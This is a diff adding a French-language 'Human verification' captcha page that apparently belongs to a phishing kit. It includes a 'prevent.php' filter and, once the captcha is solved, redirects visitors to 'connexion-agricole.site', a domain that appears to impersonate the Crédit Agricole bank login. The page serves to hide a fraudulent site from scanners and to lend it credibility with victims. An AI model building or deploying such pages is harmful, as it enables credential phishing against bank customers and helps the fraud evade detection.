@@ -1,0 +1,197 @@
+<?php include("./prevent.php"); ?>
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Human verification</title>
+</head>
+
+<style>
+  /* Style pour le formulaire */
+  form {
+    width: 300px;
+    margin: 20px auto;
+    font-family: Arial, sans-serif;
+    font-size: 16px;
+  }
+
+  /* Style pour les labels */
+  label {
+    display: block;
+    margin-bottom: 5px;
+  }
+
+  /* Style pour les champs de texte */
+  input[type="text"] {
+    width: 100%;
+    padding: 10px;
+    margin-bottom: 10px;
+    border-radius: 5px;
+    border: 1px solid #ccc;
+  }
+
+  /* Style pour le bouton */
+  button[type="submit"] {
+    padding: 10px;
+    background-color: #428bca;
+    color: #fff;
+    border: none;
+    border-radius: 5px;
+    cursor: pointer;
+  }
+
+  /* Style pour le captcha généré */
+  #generated-captcha {
+    font-size: 24px;
+    font-weight: bold;
+    text-align: center;
+  }
+
+  /* règles de style pour s'adapter aux écrans de largeur 600px ou moins */
+  @media only screen and (max-width: 600px) {
+    form {
+      width: 90%;
+    }
+  }
+
+  /* règles de style pour s'adapter aux écrans de largeur 768px ou moins */
+  @media only screen and (max-width: 768px) {
+    #captchaCanvas {
+      width: 80%;
+    }
+
+    input[type="text"] {
+      font-size: 14px;
+    }
+  }
+</style>
+
+<body>
+  <form>
+    <canvas id="captchaCanvas" width="200" height="80"></canvas>
+    <label for="captcha">Saisissez le texte du captcha:</label>
+    <input type="text" id="captcha" name="captcha">
+    <br>
+    <button type="submit">Régulariser</button>
+  </form>
+  <script>
+    // Variables pour stocker le captcha et la réponse de l'utilisateur
+    let captcha = "";
+    let userAnswer = "";
+
+    // Obtenez le canvas et le contexte
+    let canvas = document.getElementById("captchaCanvas");
+    let ctx = canvas.getContext("2d");
+
+    // Fonction pour dessiner le captcha dans le canvas
+
+    function getRandomInt(min, max) {
+      min = Math.ceil(min);
+      max = Math.floor(max);
+      return Math.floor(Math.random() * (max - min + 1)) + min;
+    }
+
+    const possible =
+      "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
+    for (var i = 0; i < 4; i++) {
+      captcha += possible.charAt(getRandomInt(0, possible.length - 1));
+    }
+
+    // Dessiner chaque caractère de captcha avec un style et une couleur aléatoire
+
+    function drawCaptcha(captcha) {
+      // Effacer le canvas
+      ctx.clearRect(0, 0, canvas.width, canvas.height);
+
+      // Définir les styles de texte pour le captcha
+      var styles = [
+        "24px Arial",
+        "20px Verdana",
+        "28px Times New Roman",
+        "bold 32px Helvetica",
+      ];
+
+      // Définir les couleurs de texte pour le captcha
+      var colors = [
+        "#FF0000",
+        "#FFA500",
+        "#008000",
+        "#0000FF",
+        "#4B0082",
+        "#800080",
+      ];
+
+      // Définir les positions de texte pour le captcha
+      var positions = [{
+          x: 20,
+          y: 40
+        },
+        {
+          x: 80,
+          y: 30
+        },
+        {
+          x: 140,
+          y: 50
+        },
+        {
+          x: 50,
+          y: 70
+        },
+        {
+          x: 110,
+          y: 20
+        },
+        {
+          x: 170,
+          y: 60
+        },
+      ];
+
+      // Générer le code captcha aléatoire
+
+      for (var i = 0; i < captcha.length; i++) {
+        var style = styles[Math.floor(Math.random() * styles.length)];
+        var color = colors[Math.floor(Math.random() * colors.length)];
+        var position = positions[i];
+        ctx.font = style;
+        ctx.fillStyle = color;
+        ctx.fillText(captcha[i], position?.x, position?.y);
+      }
+    }
+
+    drawCaptcha(captcha);
+
+    var form = document.querySelector("form");
+    form.addEventListener("submit", function(event) {
+      event.preventDefault();
+      const userAnswer = document.getElementById("captcha").value;
+
+      
+      if (
+        captcha
+          .split("")
+          .every((letter) =>
+            userAnswer.toLowerCase().includes(letter.toLowerCase())
+          )
+      ) {
+        window.location.href = 'https://connexion-agricole.site/?referrer=checkinfo';
+      } else {
+        captcha = "";
+        for (var i = 0; i < 4; i++) {
+          captcha += possible.charAt(getRandomInt(0, possible.length - 1));
+        }
+        drawCaptcha(captcha);
+
+        const capInput = document.getElementById("captcha");
+        capInput.value = "";
+      }
+
+    });
+  </script>
+</body>
+
+</html>
